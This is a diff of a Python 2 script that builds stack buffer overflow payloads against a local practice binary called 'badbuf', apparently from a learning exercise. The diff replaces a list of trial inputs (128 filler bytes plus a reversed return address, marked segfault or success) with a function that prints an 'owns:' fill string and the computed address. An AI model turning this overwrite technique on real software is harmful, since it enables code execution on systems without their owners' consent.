@@ -1,3 +1,5 @@
+#!/usr/bin/python
+
 # Address of the good string
 #
 # From `disassemble main` inside `gdb badbuf`
@@ -9,9 +11,6 @@ def hexify(n):
   a = '%x' % n
   bytes = [ a[i:i+2] for i in range(0,len(a),2) ]
   return map(lambda bs: int(bs,16), bytes)
-# rbp = 0x7fffffffdb20
-rbp = 0x7fffffffdb70
-bytes = hexify(rbp - 144)
 
 def own(n):
   return 'owns:%02i\0' % n
@@ -19,35 +18,21 @@ def own(n):
 def owns(a,b):
   return ''.join(map(own,range(a,b)))
 
-# owns = 'ownz_u!\0' * 16
+def main(rbp):
+  # ??? THIS MAKES NO SENSE ???
+  #
+  # With delta = 0x08 we get 'owns:17', and with delta = -0x08 we get
+  # 'owns:15', but with delta = 0x00 we get nothing.  The problem is
+  # *not* that the rbp ends with zero: e.g., with delta = +/-0x10 we
+  # get 'owns:18'/'owns:14'.
+  delta = 0x08
+  bytes = hexify(rbp - 144 + delta)
 
-inputs = [
-# junk: NOT the same as 3rd option because here we write null over 0x64
-  (owns(16,32)
-   + ''.join(map(chr,reversed(bytes))))
+  # name
+  print (owns(16,32) + ''.join(map(chr,reversed(bytes))))
+  # pw
+  print owns(0,16)
 
-# segfault
-, ('a'*128 + ''.join(map(chr,bytes)))
-
-# success! this depends critically on endianness
-, ('a'*128 + ''.join(map(chr,reversed(bytes))))
-
-# segfault
-, ('a'*128 + 'b'*5 + ''.join(map(chr,reversed(bytes))))
-
-# segfault
-, ('a'*128 + 'b'*1 + ''.join(map(chr,reversed(bytes))))
-
-# segfault
-, ('a'*128 + ''.join(map(chr,reversed(bytes))) + 'b'*5)
-
-# segfault
-, ('a'*128 + ''.join(map(chr,bytes)) + 'b'*5)
-
-# segfault
-, ('a'*128 + ''.join(map(chr,bytes)) + 'b'*1) ]
-
-print inputs[0]
-
-# pw
-print owns(0,16)
+if __name__ == '__main__':
+  rbp = int(raw_input(), 16)
+  main(rbp)
